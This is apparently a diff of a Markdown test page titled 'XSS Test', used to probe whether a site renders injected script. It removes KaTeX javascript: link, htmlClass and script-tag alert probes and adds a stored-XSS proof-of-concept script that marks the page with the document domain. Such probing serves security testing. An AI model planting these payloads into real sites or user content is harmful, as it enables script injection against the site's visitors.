@@ -1,16 +1,10 @@
 ---
 title: "XSS Test"
-description: "rendered xss probe r2"
+description: "stored xss poc"
 ---
 
 XSSPROBESTART
 
-ExprCanary: {7*7}
-
-KatexHref: $\href{javascript:alert('XSSKATEX')}{KTXCLICKME}$
-
-KatexHtml: $\htmlClass{xsscls}{\text{KTXHTML}}$
-
-ScriptTag: <script>alert('XSSSCRIPT-'+document.domain)</script>
+<script>document.documentElement.setAttribute('data-xss-proof','FIRED-'+document.domain)</script>
 
 XSSPROBEEND
